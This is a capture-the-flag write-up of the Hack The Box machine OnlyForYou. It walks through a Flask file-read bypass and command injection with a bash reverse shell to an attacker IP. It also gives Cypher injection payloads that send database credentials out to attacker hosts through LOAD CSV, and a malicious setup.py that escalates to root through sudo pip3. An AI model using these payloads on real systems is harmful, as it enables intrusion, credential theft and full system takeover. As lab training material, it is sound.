🚩 Hack The Box – OnlyForYou (10.10.11.210)

Category: Medium | Tech Stack: Python Flask, Neo4j, pip | Vulns: LFR, RCE, Cypher Injection, pip-based PrivEsc

🚩 Hack The Box – OnlyForYou (10.10.11.210)

Category: Medium | Tech Stack: Python Flask, Neo4j, pip | Vulns: LFR, RCE, Cypher Injection, pip-based PrivEsc
Author: Paraphrased by tahahfatima
🧠 Summary

The OnlyForYou HTB box presented a fascinating blend of web exploitation and privilege escalation, exploiting both misconfigurations and language-specific flaws:

    ✅ Local File Read via bypassing flawed validation in a Flask app

    💥 Remote Code Execution through command injection in form.py

    🧩 Cypher Injection against Neo4j (Graph DB) to exfiltrate credentials

    🐍 pip Download Code Execution to escalate to root

🔍 Recon & Enumeration

Initial scan revealed only:

22/tcp  Open   ssh
80/tcp  Open   http

Accessing port 80 revealed a basic web application. Using ffuf to brute-force subdomains led to discovery of an admin panel.
🔎 Source Code Review

The app allowed image downloads, implemented using Flask's /download route:

@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    ...
    return send_file(filename, as_attachment=True)

The checks for ".." could be bypassed by providing an absolute path (e.g., /etc/nginx/nginx.conf). This led to LFR.
⚠️ Local File Read ➤ RCE

Reading app.py revealed it imports and uses a function from form.py:

result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)

This command directly includes user input in a shell string, enabling command injection. Exploited by providing a reverse shell payload:

bash -i >& /dev/tcp/10.10.14.74/4444 0>&1

Gained initial foothold as john.
🧪 Post-Exploitation & Port Forwarding

Used ss -tulwn to find services on ports 8001 and 3000. Forwarded them via chisel.

Logged into a web interface (admin:admin) where the app displayed a migration task involving Neo4j.
🧠 Neo4j Cypher Injection (Graph DB)

Discovered injectable Cypher queries. Exploited them to extract internal DB info using an SSRF-like technique (exfiltration via LOAD CSV FROM):

Get DB version, name, edition:

' OR 1=1 WITH 1 as a 
CALL dbms.components() YIELD name, versions, edition 
UNWIND versions as version 
LOAD CSV FROM 'http://10.10.14.92/?v=' + version + '&n=' + name + '&e=' + edition AS l RETURN 0//

Dump usernames & hashes:

' OR 1=1 WITH 1 as a 
MATCH (u:user) UNWIND keys(u) as p 
LOAD CSV FROM 'http://10.10.14.191:8000/?' + p + '=' + toString(u[p]) AS l RETURN 0//

Cracked john’s password using john against dumped hashes. Retrieved the user flag.
🔝 Privilege Escalation – pip-based Code Execution

Discovered john could run the following as root without password:

sudo /usr/bin/pip3 download http://127.0.0.1:3000/<malicious>.tar.gz

🧪 Created a malicious Python package that runs a root shell on install:

# setup.py payload example
from setuptools import setup
import os
os.system('chmod +s /bin/bash')
setup(name='exploitpy', version='0.0.1', packages=['exploitpy'])

📦 Uploaded .tar.gz to local file server, then executed with:

sudo /usr/bin/pip3 download http://127.0.0.1:3000/exploitpy-0.0.1.tar.gz

Got root shell. 🎯
🏁 Flags

    ✅ user.txt – Acquired via hash cracking

    ✅ root.txt – Retrieved after pip3 privilege escalation
